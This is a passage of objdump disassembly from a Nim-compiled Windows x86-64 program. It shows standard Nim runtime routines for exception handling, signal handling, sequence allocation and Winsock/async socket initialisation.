  405148:	5e                   	pop    %rsi
  405149:	5f                   	pop    %rdi
  40514a:	5d                   	pop    %rbp
  40514b:	41 5c                	pop    %r12
  40514d:	41 5d                	pop    %r13
  40514f:	41 5e                	pop    %r14
  405151:	41 5f                	pop    %r15
  405153:	c3                   	ret

0000000000405154 <reportUnhandledError__na8C8pUZ9cLQWVwk35l5vfw_2>:
  405154:	e9 fa fc ff ff       	jmp    404e53 <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3>

0000000000405159 <threadProcWrapDispatch__Mxf9cF7DzrT73i52k5zPHQA_2>:
  405159:	55                   	push   %rbp
  40515a:	53                   	push   %rbx
  40515b:	48 89 e5             	mov    %rsp,%rbp
  40515e:	48 81 ec 48 01 00 00 	sub    $0x148,%rsp
  405165:	48 89 4d 18          	mov    %rcx,0x18(%rbp)
  405169:	e8 32 cb ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.74>
  40516e:	48 89 85 e0 fe ff ff 	mov    %rax,-0x120(%rbp)
  405175:	e8 26 cb ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.74>
  40517a:	48 8d 8d e8 fe ff ff 	lea    -0x118(%rbp),%rcx
  405181:	48 8b 50 20          	mov    0x20(%rax),%rdx
  405185:	48 89 48 20          	mov    %rcx,0x20(%rax)
  405189:	48 83 c1 10          	add    $0x10,%rcx
  40518d:	48 89 95 e8 fe ff ff 	mov    %rdx,-0x118(%rbp)
  405194:	48 89 ea             	mov    %rbp,%rdx
  405197:	e8 a4 32 00 00       	call   408440 <_setjmp>
  40519c:	48 98                	cltq
  40519e:	48 85 c0             	test   %rax,%rax
  4051a1:	48 89 85 f0 fe ff ff 	mov    %rax,-0x110(%rbp)
  4051a8:	75 07                	jne    4051b1 <threadProcWrapDispatch__Mxf9cF7DzrT73i52k5zPHQA_2+0x58>
  4051aa:	48 8b 45 18          	mov    0x18(%rbp),%rax
  4051ae:	ff 50 10             	call   *0x10(%rax)
  4051b1:	e8 87 cb ff ff       	call   401d3d <popSafePoint>
  4051b6:	48 8b 85 e0 fe ff ff 	mov    -0x120(%rbp),%rax
  4051bd:	31 db                	xor    %ebx,%ebx
  4051bf:	48 8b 40 08          	mov    0x8(%rax),%rax
  4051c3:	48 85 c0             	test   %rax,%rax
  4051c6:	74 03                	je     4051cb <threadProcWrapDispatch__Mxf9cF7DzrT73i52k5zPHQA_2+0x72>
  4051c8:	48 8b 18             	mov    (%rax),%rbx
  4051cb:	48 ff cb             	dec    %rbx
  4051ce:	48 85 db             	test   %rbx,%rbx
  4051d1:	79 0c                	jns    4051df <threadProcWrapDispatch__Mxf9cF7DzrT73i52k5zPHQA_2+0x86>
  4051d3:	48 83 bd f0 fe ff ff 	cmpq   $0x0,-0x110(%rbp)
  4051da:	00 
  4051db:	74 59                	je     405236 <threadProcWrapDispatch__Mxf9cF7DzrT73i52k5zPHQA_2+0xdd>
  4051dd:	eb 27                	jmp    405206 <threadProcWrapDispatch__Mxf9cF7DzrT73i52k5zPHQA_2+0xad>
  4051df:	48 8b 95 e0 fe ff ff 	mov    -0x120(%rbp),%rdx
  4051e6:	48 89 d8             	mov    %rbx,%rax
  4051e9:	48 c1 e0 04          	shl    $0x4,%rax
  4051ed:	48 03 42 08          	add    0x8(%rdx),%rax
  4051f1:	48 8b 48 18          	mov    0x18(%rax),%rcx
  4051f5:	48 8b 40 10          	mov    0x10(%rax),%rax
  4051f9:	48 85 c9             	test   %rcx,%rcx
  4051fc:	74 04                	je     405202 <threadProcWrapDispatch__Mxf9cF7DzrT73i52k5zPHQA_2+0xa9>
  4051fe:	ff d0                	call   *%rax
  405200:	eb c9                	jmp    4051cb <threadProcWrapDispatch__Mxf9cF7DzrT73i52k5zPHQA_2+0x72>
  405202:	ff d0                	call   *%rax
  405204:	eb c5                	jmp    4051cb <threadProcWrapDispatch__Mxf9cF7DzrT73i52k5zPHQA_2+0x72>
  405206:	e8 95 ca ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.74>
  40520b:	48 8b 48 20          	mov    0x20(%rax),%rcx
  40520f:	48 85 c9             	test   %rcx,%rcx
  405212:	75 13                	jne    405227 <threadProcWrapDispatch__Mxf9cF7DzrT73i52k5zPHQA_2+0xce>
  405214:	48 8b 48 28          	mov    0x28(%rax),%rcx
  405218:	e8 37 ff ff ff       	call   405154 <reportUnhandledError__na8C8pUZ9cLQWVwk35l5vfw_2>
  40521d:	b9 01 00 00 00       	mov    $0x1,%ecx
  405222:	e8 f9 31 00 00       	call   408420 <exit>
  405227:	48 83 c1 10          	add    $0x10,%rcx
  40522b:	ba 01 00 00 00       	mov    $0x1,%edx
  405230:	e8 81 31 00 00       	call   4083b6 <longjmp>
  405235:	90                   	nop
  405236:	48 81 c4 48 01 00 00 	add    $0x148,%rsp
  40523d:	5b                   	pop    %rbx
  40523e:	5d                   	pop    %rbp
  40523f:	c3                   	ret

0000000000405240 <raiseExceptionAux__na8C8pUZ9cLQWVwk35l5vfw>:
  405240:	57                   	push   %rdi
  405241:	56                   	push   %rsi
  405242:	53                   	push   %rbx
  405243:	48 83 ec 20          	sub    $0x20,%rsp
  405247:	48 89 ce             	mov    %rcx,%rsi
  40524a:	e8 51 ca ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.74>
  40524f:	48 89 c7             	mov    %rax,%rdi
  405252:	48 8b 00             	mov    (%rax),%rax
  405255:	48 85 c0             	test   %rax,%rax
  405258:	75 19                	jne    405273 <raiseExceptionAux__na8C8pUZ9cLQWVwk35l5vfw+0x33>
  40525a:	48 83 7f 20 00       	cmpq   $0x0,0x20(%rdi)
  40525f:	75 23                	jne    405284 <raiseExceptionAux__na8C8pUZ9cLQWVwk35l5vfw+0x44>
  405261:	48 89 f1             	mov    %rsi,%rcx
  405264:	e8 eb fe ff ff       	call   405154 <reportUnhandledError__na8C8pUZ9cLQWVwk35l5vfw_2>
  405269:	b9 01 00 00 00       	mov    $0x1,%ecx
  40526e:	e8 ad 31 00 00       	call   408420 <exit>
  405273:	48 89 f1             	mov    %rsi,%rcx
  405276:	ff d0                	call   *%rax
  405278:	84 c0                	test   %al,%al
  40527a:	75 de                	jne    40525a <raiseExceptionAux__na8C8pUZ9cLQWVwk35l5vfw+0x1a>
  40527c:	48 83 c4 20          	add    $0x20,%rsp
  405280:	5b                   	pop    %rbx
  405281:	5e                   	pop    %rsi
  405282:	5f                   	pop    %rdi
  405283:	c3                   	ret
  405284:	e8 17 ca ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.74>
  405289:	48 8d 4e 28          	lea    0x28(%rsi),%rcx
  40528d:	48 8b 50 28          	mov    0x28(%rax),%rdx
  405291:	48 89 c3             	mov    %rax,%rbx
  405294:	e8 67 dc ff ff       	call   402f00 <asgnRef.lto_priv.65>
  405299:	48 8d 4b 28          	lea    0x28(%rbx),%rcx
  40529d:	48 89 f2             	mov    %rsi,%rdx
  4052a0:	e8 1d dc ff ff       	call   402ec2 <unsureAsgnRef>
  4052a5:	48 8b 4f 20          	mov    0x20(%rdi),%rcx
  4052a9:	ba 01 00 00 00       	mov    $0x1,%edx
  4052ae:	48 83 c1 10          	add    $0x10,%rcx
  4052b2:	e8 ff 30 00 00       	call   4083b6 <longjmp>
  4052b7:	90                   	nop

00000000004052b8 <raiseExceptionEx>:
  4052b8:	57                   	push   %rdi
  4052b9:	56                   	push   %rsi
  4052ba:	53                   	push   %rbx
  4052bb:	48 83 ec 40          	sub    $0x40,%rsp
  4052bf:	48 83 79 10 00       	cmpq   $0x0,0x10(%rcx)
  4052c4:	48 89 cb             	mov    %rcx,%rbx
  4052c7:	75 04                	jne    4052cd <raiseExceptionEx+0x15>
  4052c9:	48 89 51 10          	mov    %rdx,0x10(%rcx)
  4052cd:	48 8d 74 24 28       	lea    0x28(%rsp),%rsi
  4052d2:	ba 18 00 00 00       	mov    $0x18,%edx
  4052d7:	4c 89 44 24 70       	mov    %r8,0x70(%rsp)
  4052dc:	48 89 f1             	mov    %rsi,%rcx
  4052df:	e8 de c6 ff ff       	call   4019c2 <nimZeroMem.lto_priv.59>
  4052e4:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
  4052e8:	48 8d 15 11 03 02 00 	lea    0x20311(%rip),%rdx        # 425600 <NTI__uB9b75OUPRENsBAu4AnoePA_>
  4052ef:	4c 8b 44 24 70       	mov    0x70(%rsp),%r8
  4052f4:	4c 89 4c 24 38       	mov    %r9,0x38(%rsp)
  4052f9:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
  405300:	00 
  405301:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
  405306:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  40530b:	e8 af 0b 00 00       	call   405ebf <incrSeqV3>
  405310:	48 8d 4b 20          	lea    0x20(%rbx),%rcx
  405314:	48 89 c2             	mov    %rax,%rdx
  405317:	e8 e4 db ff ff       	call   402f00 <asgnRef.lto_priv.65>
  40531c:	48 8b 53 20          	mov    0x20(%rbx),%rdx
  405320:	48 8b 02             	mov    (%rdx),%rax
  405323:	48 8d 48 01          	lea    0x1(%rax),%rcx
  405327:	48 6b c0 18          	imul   $0x18,%rax,%rax
  40532b:	48 89 0a             	mov    %rcx,(%rdx)
  40532e:	b9 06 00 00 00       	mov    $0x6,%ecx
  405333:	48 8d 44 02 10       	lea    0x10(%rdx,%rax,1),%rax
  405338:	48 89 c7             	mov    %rax,%rdi
  40533b:	f3 a5                	rep movsl (%rsi),(%rdi)
  40533d:	48 89 d9             	mov    %rbx,%rcx
  405340:	e8 fb fe ff ff       	call   405240 <raiseExceptionAux__na8C8pUZ9cLQWVwk35l5vfw>
  405345:	90                   	nop
  405346:	48 83 c4 40          	add    $0x40,%rsp
  40534a:	5b                   	pop    %rbx
  40534b:	5e                   	pop    %rsi
  40534c:	5f                   	pop    %rdi
  40534d:	c3                   	ret

000000000040534e <raiseEIO__ZYk14k3sVNZUIjJjtqzFZQ.constprop.40>:
  40534e:	56                   	push   %rsi
  40534f:	53                   	push   %rbx
  405350:	48 83 ec 38          	sub    $0x38,%rsp
  405354:	48 8d 0d a5 8e 02 00 	lea    0x28ea5(%rip),%rcx        # 42e200 <NTI__HMIVdYjdZYWskTmTQVo5BQ_>
  40535b:	ba 30 00 00 00       	mov    $0x30,%edx
  405360:	e8 81 e9 ff ff       	call   403ce6 <newObj>
  405365:	48 8d 0d d4 c5 00 00 	lea    0xc5d4(%rip),%rcx        # 411940 <TM__MnCJ0VAmeZ9aTATUB39cx60Q_10>
  40536c:	48 89 c3             	mov    %rax,%rbx
  40536f:	48 8b 73 18          	mov    0x18(%rbx),%rsi
  405373:	48 8d 05 46 8e 02 00 	lea    0x28e46(%rip),%rax        # 42e1c0 <NTI__iLZrPn9anoh9ad1MmO0RczFw_>
  40537a:	48 89 03             	mov    %rax,(%rbx)
  40537d:	48 8d 05 7b 6d 00 00 	lea    0x6d7b(%rip),%rax        # 40c0ff <.rdata+0xff>
  405384:	48 89 43 10          	mov    %rax,0x10(%rbx)
  405388:	e8 b3 e8 ff ff       	call   403c40 <copyStringRC1>
  40538d:	48 85 f6             	test   %rsi,%rsi
  405390:	48 89 43 18          	mov    %rax,0x18(%rbx)
  405394:	74 08                	je     40539e <raiseEIO__ZYk14k3sVNZUIjJjtqzFZQ.constprop.40+0x50>
  405396:	48 89 f1             	mov    %rsi,%rcx
  405399:	e8 93 db ff ff       	call   402f31 <nimGCunrefNoCycle.lto_priv.80>
  40539e:	48 8d 4b 08          	lea    0x8(%rbx),%rcx
  4053a2:	31 d2                	xor    %edx,%edx
  4053a4:	e8 57 db ff ff       	call   402f00 <asgnRef.lto_priv.65>
  4053a9:	4c 8d 0d 57 6d 00 00 	lea    0x6d57(%rip),%r9        # 40c107 <.rdata+0x107>
  4053b0:	48 89 d9             	mov    %rbx,%rcx
  4053b3:	48 c7 44 24 20 8a 00 	movq   $0x8a,0x20(%rsp)
  4053ba:	00 00 
  4053bc:	4c 8d 05 4b 6d 00 00 	lea    0x6d4b(%rip),%r8        # 40c10e <.rdata+0x10e>
  4053c3:	48 8d 15 35 6d 00 00 	lea    0x6d35(%rip),%rdx        # 40c0ff <.rdata+0xff>
  4053ca:	e8 e9 fe ff ff       	call   4052b8 <raiseExceptionEx>
  4053cf:	90                   	nop

00000000004053d0 <raiseOSError__CWyPYlyH9a6rAuZckFyVxPA>:
  4053d0:	48 83 ec 38          	sub    $0x38,%rsp
  4053d4:	e8 da f8 ff ff       	call   404cb3 <newOSError__JXEuze9ctNbkn51HYBflQLg>
  4053d9:	4c 8d 0d 37 6d 00 00 	lea    0x6d37(%rip),%r9        # 40c117 <.rdata+0x117>
  4053e0:	48 c7 44 24 20 5e 00 	movq   $0x5e,0x20(%rsp)
  4053e7:	00 00 
  4053e9:	4c 8d 05 31 6d 00 00 	lea    0x6d31(%rip),%r8        # 40c121 <.rdata+0x121>
  4053f0:	48 89 c1             	mov    %rax,%rcx
  4053f3:	48 8d 15 e0 6c 00 00 	lea    0x6ce0(%rip),%rdx        # 40c0da <.rdata+0xda>
  4053fa:	e8 b9 fe ff ff       	call   4052b8 <raiseExceptionEx>
  4053ff:	90                   	nop
  405400:	48 83 c4 38          	add    $0x38,%rsp
  405404:	c3                   	ret

0000000000405405 <PreMainInner>:
  405405:	57                   	push   %rdi
  405406:	56                   	push   %rsi
  405407:	53                   	push   %rbx
  405408:	48 83 ec 30          	sub    $0x30,%rsp
  40540c:	48 8d 0d ed fb 01 00 	lea    0x1fbed(%rip),%rcx        # 425000 <echoLock__N6SWfXRvlztVlLUFTGu6OQ>
  405413:	ff 15 9b 2e 04 00    	call   *0x42e9b(%rip)        # 4482b4 <__imp_InitializeCriticalSection>
  405419:	31 c9                	xor    %ecx,%ecx
  40541b:	48 8b 3d de 5c 00 00 	mov    0x5cde(%rip),%rdi        # 40b100 <__imp___acrt_iob_func>
  405422:	ff d7                	call   *%rdi
  405424:	48 8b 35 89 2f 04 00 	mov    0x42f89(%rip),%rsi        # 4483b4 <__imp__fileno>
  40542b:	48 89 c1             	mov    %rax,%rcx
  40542e:	ff d6                	call   *%rsi
  405430:	ba 00 80 00 00       	mov    $0x8000,%edx
  405435:	48 8b 1d a0 2f 04 00 	mov    0x42fa0(%rip),%rbx        # 4483dc <__imp__setmode>
  40543c:	89 c1                	mov    %eax,%ecx
  40543e:	ff d3                	call   *%rbx
  405440:	b9 01 00 00 00       	mov    $0x1,%ecx
  405445:	ff d7                	call   *%rdi
  405447:	48 89 c1             	mov    %rax,%rcx
  40544a:	ff d6                	call   *%rsi
  40544c:	ba 00 80 00 00       	mov    $0x8000,%edx
  405451:	89 c1                	mov    %eax,%ecx
  405453:	ff d3                	call   *%rbx
  405455:	b9 02 00 00 00       	mov    $0x2,%ecx
  40545a:	ff d7                	call   *%rdi
  40545c:	48 89 c1             	mov    %rax,%rcx
  40545f:	ff d6                	call   *%rsi
  405461:	ba 00 80 00 00       	mov    $0x8000,%edx
  405466:	89 c1                	mov    %eax,%ecx
  405468:	ff d3                	call   *%rbx
  40546a:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
  40546f:	ff 15 6b fc 01 00    	call   *0x1fc6b(%rip)        # 4250e0 <Dl_4756003_>
  405475:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
  40547a:	ff 15 58 fc 01 00    	call   *0x1fc58(%rip)        # 4250d8 <Dl_4756006_>
  405480:	48 8d 0d a9 c2 00 00 	lea    0xc2a9(%rip),%rcx        # 411730 <TM__k6kyf4Co79a84IkK9blFuQVA_2+0x10>
  405487:	ff 15 37 2e 04 00    	call   *0x42e37(%rip)        # 4482c4 <__imp_LoadLibraryA>
  40548d:	48 85 c0             	test   %rax,%rax
  405490:	74 10                	je     4054a2 <PreMainInner+0x9d>
  405492:	48 8d 15 95 6c 00 00 	lea    0x6c95(%rip),%rdx        # 40c12e <.rdata+0x12e>
  405499:	48 89 c1             	mov    %rax,%rcx
  40549c:	ff 15 f2 2d 04 00    	call   *0x42df2(%rip)        # 448294 <__imp_GetProcAddress>
  4054a2:	48 8d 0d 39 e0 ff ff 	lea    -0x1fc7(%rip),%rcx        # 4034e2 <TM__6NbDwwj5FY059b1gz2AsAZQ_4>
  4054a9:	e8 5a cb ff ff       	call   402008 <nimRegisterThreadLocalMarker>
  4054ae:	48 8d 0d 12 e0 ff ff 	lea    -0x1fee(%rip),%rcx        # 4034c7 <TM__6NbDwwj5FY059b1gz2AsAZQ_5>
  4054b5:	e8 4e cb ff ff       	call   402008 <nimRegisterThreadLocalMarker>
  4054ba:	48 8d 0d b9 df ff ff 	lea    -0x2047(%rip),%rcx        # 40347a <TM__yu6cxgKBBXbNsTkT9cyMd4g_2>
  4054c1:	e8 42 cb ff ff       	call   402008 <nimRegisterThreadLocalMarker>
  4054c6:	48 8d 0d 92 df ff ff 	lea    -0x206e(%rip),%rcx        # 40345f <TM__yu6cxgKBBXbNsTkT9cyMd4g_3>
  4054cd:	e8 36 cb ff ff       	call   402008 <nimRegisterThreadLocalMarker>
  4054d2:	e8 c9 c7 ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.74>
  4054d7:	48 8d 0d 2d df ff ff 	lea    -0x20d3(%rip),%rcx        # 40340b <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_3>
  4054de:	e8 25 cb ff ff       	call   402008 <nimRegisterThreadLocalMarker>
  4054e3:	48 8d 15 76 c6 01 00 	lea    0x1c676(%rip),%rdx        # 421b60 <wsa__ClAT9bhT9cqG9adztamb5X9b2w>
  4054ea:	b9 01 01 00 00       	mov    $0x101,%ecx
  4054ef:	ff 15 53 47 02 00    	call   *0x24753(%rip)        # 429c48 <Dl_14038442_>
  4054f5:	85 c0                	test   %eax,%eax
  4054f7:	74 0e                	je     405507 <PreMainInner+0x102>
  4054f9:	e8 d8 c0 ff ff       	call   4015d6 <osLastError__9bUWNxbcGnToMWA9b79aTXLIw>
  4054fe:	31 d2                	xor    %edx,%edx
  405500:	89 c1                	mov    %eax,%ecx
  405502:	e8 c9 fe ff ff       	call   4053d0 <raiseOSError__CWyPYlyH9a6rAuZckFyVxPA>
  405507:	48 8d 0d 49 de ff ff 	lea    -0x21b7(%rip),%rcx        # 403357 <TM__gfe9a52b5gJr8GSrnr883iA_5>
  40550e:	e8 f5 ca ff ff       	call   402008 <nimRegisterThreadLocalMarker>
  405513:	41 b8 06 00 00 00    	mov    $0x6,%r8d
  405519:	ba 01 00 00 00       	mov    $0x1,%edx
  40551e:	b9 02 00 00 00       	mov    $0x2,%ecx
  405523:	ff 15 f7 46 02 00    	call   *0x246f7(%rip)        # 429c20 <Dl_14038260_>
  405529:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
  40552d:	48 89 c3             	mov    %rax,%rbx
  405530:	75 0e                	jne    405540 <PreMainInner+0x13b>
  405532:	e8 9f c0 ff ff       	call   4015d6 <osLastError__9bUWNxbcGnToMWA9b79aTXLIw>
  405537:	31 d2                	xor    %edx,%edx
  405539:	89 c1                	mov    %eax,%ecx
  40553b:	e8 90 fe ff ff       	call   4053d0 <raiseOSError__CWyPYlyH9a6rAuZckFyVxPA>
  405540:	48 8d 74 24 28       	lea    0x28(%rsp),%rsi
  405545:	48 89 d9             	mov    %rbx,%rcx
  405548:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
  40554f:	00 00 
  405551:	4c 8d 05 28 5b 00 00 	lea    0x5b28(%rip),%r8        # 40b080 <WSAID_CONNECTEX__YmR9c9crObjjK9ckt1ygsPQKg>
  405558:	48 89 f2             	mov    %rsi,%rdx
  40555b:	e8 1d c0 ff ff       	call   40157d <initPointer__rrU5asl0oI3yYPDxkwgTZg>
  405560:	84 c0                	test   %al,%al
  405562:	75 0e                	jne    405572 <PreMainInner+0x16d>
  405564:	e8 6d c0 ff ff       	call   4015d6 <osLastError__9bUWNxbcGnToMWA9b79aTXLIw>
  405569:	31 d2                	xor    %edx,%edx
  40556b:	89 c1                	mov    %eax,%ecx
  40556d:	e8 5e fe ff ff       	call   4053d0 <raiseOSError__CWyPYlyH9a6rAuZckFyVxPA>
  405572:	4c 8d 05 f7 5a 00 00 	lea    0x5af7(%rip),%r8        # 40b070 <WSAID_ACCEPTEX__pwoOiDuyZgHBOLaI2GSBpg>
  405579:	48 89 f2             	mov    %rsi,%rdx
  40557c:	48 89 d9             	mov    %rbx,%rcx
  40557f:	e8 f9 bf ff ff       	call   40157d <initPointer__rrU5asl0oI3yYPDxkwgTZg>
  405584:	84 c0                	test   %al,%al
  405586:	75 0e                	jne    405596 <PreMainInner+0x191>
  405588:	e8 49 c0 ff ff       	call   4015d6 <osLastError__9bUWNxbcGnToMWA9b79aTXLIw>
  40558d:	31 d2                	xor    %edx,%edx
  40558f:	89 c1                	mov    %eax,%ecx
  405591:	e8 3a fe ff ff       	call   4053d0 <raiseOSError__CWyPYlyH9a6rAuZckFyVxPA>
  405596:	4c 8d 05 c3 5a 00 00 	lea    0x5ac3(%rip),%r8        # 40b060 <WSAID_GETACCEPTEXSOCKADDRS__rSjtFMq7pCHQR2EQvcKbDg>
  40559d:	48 89 f2             	mov    %rsi,%rdx
  4055a0:	48 89 d9             	mov    %rbx,%rcx
  4055a3:	e8 d5 bf ff ff       	call   40157d <initPointer__rrU5asl0oI3yYPDxkwgTZg>
  4055a8:	84 c0                	test   %al,%al
  4055aa:	75 0e                	jne    4055ba <PreMainInner+0x1b5>
  4055ac:	e8 25 c0 ff ff       	call   4015d6 <osLastError__9bUWNxbcGnToMWA9b79aTXLIw>
  4055b1:	31 d2                	xor    %edx,%edx
  4055b3:	89 c1                	mov    %eax,%ecx
  4055b5:	e8 16 fe ff ff       	call   4053d0 <raiseOSError__CWyPYlyH9a6rAuZckFyVxPA>
  4055ba:	48 89 d9             	mov    %rbx,%rcx
  4055bd:	ff 15 4d 46 02 00    	call   *0x2464d(%rip)        # 429c10 <Dl_14038265_>
  4055c3:	90                   	nop
  4055c4:	48 83 c4 30          	add    $0x30,%rsp
  4055c8:	5b                   	pop    %rbx
  4055c9:	5e                   	pop    %rsi
  4055ca:	5f                   	pop    %rdi
  4055cb:	c3                   	ret

00000000004055cc <showErrorMessage__zsORN9crdKxsL9cHrQcdHSMw>:
  4055cc:	53                   	push   %rbx
  4055cd:	48 81 ec 50 01 00 00 	sub    $0x150,%rsp
  4055d4:	c6 44 24 3f 01       	movb   $0x1,0x3f(%rsp)
  4055d9:	8a 44 24 3f          	mov    0x3f(%rsp),%al
  4055dd:	48 89 cb             	mov    %rcx,%rbx
  4055e0:	84 c0                	test   %al,%al
  4055e2:	74 17                	je     4055fb <showErrorMessage__zsORN9crdKxsL9cHrQcdHSMw+0x2f>
  4055e4:	b9 02 00 00 00       	mov    $0x2,%ecx
  4055e9:	ff 15 11 5b 00 00    	call   *0x5b11(%rip)        # 40b100 <__imp___acrt_iob_func>
  4055ef:	48 89 da             	mov    %rbx,%rdx
  4055f2:	48 89 c1             	mov    %rax,%rcx
  4055f5:	e8 dd c7 ff ff       	call   401dd7 <rawWrite>
  4055fa:	90                   	nop
  4055fb:	48 81 c4 50 01 00 00 	add    $0x150,%rsp
  405602:	5b                   	pop    %rbx
  405603:	c3                   	ret

0000000000405604 <signalHandler>:
  405604:	48 83 ec 28          	sub    $0x28,%rsp
  405608:	48 8d 05 74 6b 00 00 	lea    0x6b74(%rip),%rax        # 40c183 <.rdata+0x183>
  40560f:	83 f9 02             	cmp    $0x2,%ecx
  405612:	74 39                	je     40564d <signalHandler+0x49>
  405614:	48 8d 05 88 6b 00 00 	lea    0x6b88(%rip),%rax        # 40c1a3 <.rdata+0x1a3>
  40561b:	83 f9 0b             	cmp    $0xb,%ecx
  40561e:	74 2d                	je     40564d <signalHandler+0x49>
  405620:	48 8d 05 ba 6b 00 00 	lea    0x6bba(%rip),%rax        # 40c1e1 <.rdata+0x1e1>
  405627:	83 f9 16             	cmp    $0x16,%ecx
  40562a:	74 21                	je     40564d <signalHandler+0x49>
  40562c:	48 8d 05 25 6b 00 00 	lea    0x6b25(%rip),%rax        # 40c158 <.rdata+0x158>
  405633:	83 f9 08             	cmp    $0x8,%ecx
  405636:	74 15                	je     40564d <signalHandler+0x49>
  405638:	48 8d 05 34 6b 00 00 	lea    0x6b34(%rip),%rax        # 40c173 <.rdata+0x173>
  40563f:	83 f9 04             	cmp    $0x4,%ecx
  405642:	48 8d 0d b8 6b 00 00 	lea    0x6bb8(%rip),%rcx        # 40c201 <.rdata+0x201>
  405649:	48 0f 44 c1          	cmove  %rcx,%rax
  40564d:	48 89 c1             	mov    %rax,%rcx
  405650:	e8 77 ff ff ff       	call   4055cc <showErrorMessage__zsORN9crdKxsL9cHrQcdHSMw>
  405655:	b9 01 00 00 00       	mov    $0x1,%ecx
  40565a:	e8 c1 2d 00 00       	call   408420 <exit>
  40565f:	90                   	nop

0000000000405660 <raiseOverflow>:
  405660:	56                   	push   %rsi
  405661:	53                   	push   %rbx
  405662:	48 83 ec 38          	sub    $0x38,%rsp
  405666:	48 8d 0d 13 fe 01 00 	lea    0x1fe13(%rip),%rcx        # 425480 <NTI__Pjt0MQjoA6TAHAHOFNel9cg_>
  40566d:	ba 30 00 00 00       	mov    $0x30,%edx
  405672:	e8 6f e6 ff ff       	call   403ce6 <newObj>
  405677:	48 8d 0d a2 b9 00 00 	lea    0xb9a2(%rip),%rcx        # 411020 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_9>
  40567e:	48 89 c3             	mov    %rax,%rbx
  405681:	48 8b 73 18          	mov    0x18(%rbx),%rsi
  405685:	48 8d 05 34 fe 01 00 	lea    0x1fe34(%rip),%rax        # 4254c0 <NTI__Ss6DFlX5iSZpHRZDmP74bg_>
  40568c:	48 89 03             	mov    %rax,(%rbx)
  40568f:	48 8d 05 87 6b 00 00 	lea    0x6b87(%rip),%rax        # 40c21d <.rdata+0x21d>
  405696:	48 89 43 10          	mov    %rax,0x10(%rbx)
  40569a:	e8 a1 e5 ff ff       	call   403c40 <copyStringRC1>
  40569f:	48 85 f6             	test   %rsi,%rsi
  4056a2:	48 89 43 18          	mov    %rax,0x18(%rbx)
  4056a6:	74 08                	je     4056b0 <raiseOverflow+0x50>
  4056a8:	48 89 f1             	mov    %rsi,%rcx
  4056ab:	e8 81 d8 ff ff       	call   402f31 <nimGCunrefNoCycle.lto_priv.80>
  4056b0:	48 c7 44 24 20 31 00 	movq   $0x31,0x20(%rsp)
  4056b7:	00 00 
  4056b9:	4c 8d 0d 85 6a 00 00 	lea    0x6a85(%rip),%r9        # 40c145 <.rdata+0x145>
  4056c0:	48 89 d9             	mov    %rbx,%rcx
  4056c3:	4c 8d 05 85 6a 00 00 	lea    0x6a85(%rip),%r8        # 40c14f <.rdata+0x14f>
  4056ca:	48 8d 15 4c 6b 00 00 	lea    0x6b4c(%rip),%rdx        # 40c21d <.rdata+0x21d>
  4056d1:	e8 e2 fb ff ff       	call   4052b8 <raiseExceptionEx>
  4056d6:	90                   	nop

00000000004056d7 <newSeq>:
  4056d7:	53                   	push   %rbx
  4056d8:	48 83 ec 20          	sub    $0x20,%rsp
  4056dc:	48 8b 41 10          	mov    0x10(%rcx),%rax
  4056e0:	48 89 d3             	mov    %rdx,%rbx
  4056e3:	48 0f af 10          	imul   (%rax),%rdx
  4056e7:	70 06                	jo     4056ef <newSeq+0x18>
  4056e9:	48 83 c2 10          	add    $0x10,%rdx
  4056ed:	71 05                	jno    4056f4 <newSeq+0x1d>
  4056ef:	e8 6c ff ff ff       	call   405660 <raiseOverflow>
  4056f4:	e8 ed e5 ff ff       	call   403ce6 <newObj>
  4056f9:	48 89 18             	mov    %rbx,(%rax)
  4056fc:	48 89 58 08          	mov    %rbx,0x8(%rax)
  405700:	48 83 c4 20          	add    $0x20,%rsp
  405704:	5b                   	pop    %rbx
  405705:	c3                   	ret

0000000000405706 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.23>:
  405706:	41 57                	push   %r15
  405708:	41 56                	push   %r14
  40570a:	41 55                	push   %r13
  40570c:	41 54                	push   %r12
  40570e:	55                   	push   %rbp
  40570f:	57                   	push   %rdi
  405710:	56                   	push   %rsi
  405711:	53                   	push   %rbx
  405712:	48 83 ec 28          	sub    $0x28,%rsp
  405716:	41 8a 40 08          	mov    0x8(%r8),%al
  40571a:	3c 12                	cmp    $0x12,%al
  40571c:	48 89 cb             	mov    %rcx,%rbx
  40571f:	48 89 d6             	mov    %rdx,%rsi
  405722:	4c 89 c5             	mov    %r8,%rbp
  405725:	44 89 cf             	mov    %r9d,%edi
  405728:	45 0f b6 e1          	movzbl %r9b,%r12d
  40572c:	0f 84 ed 01 00 00    	je     40591f <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.23+0x219>
  405732:	77 1b                	ja     40574f <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.23+0x49>
  405734:	3c 10                	cmp    $0x10,%al
  405736:	0f 84 06 02 00 00    	je     405942 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.23+0x23c>
  40573c:	0f 87 bb 01 00 00    	ja     4058fd <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.23+0x1f7>
  405742:	3c 04                	cmp    $0x4,%al
  405744:	0f 84 f8 01 00 00    	je     405942 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.23+0x23c>
  40574a:	e9 6e 02 00 00       	jmp    4059bd <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.23+0x2b7>
  40574f:	3c 18                	cmp    $0x18,%al
  405751:	0f 84 83 00 00 00    	je     4057da <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.23+0xd4>
  405757:	3c 1c                	cmp    $0x1c,%al
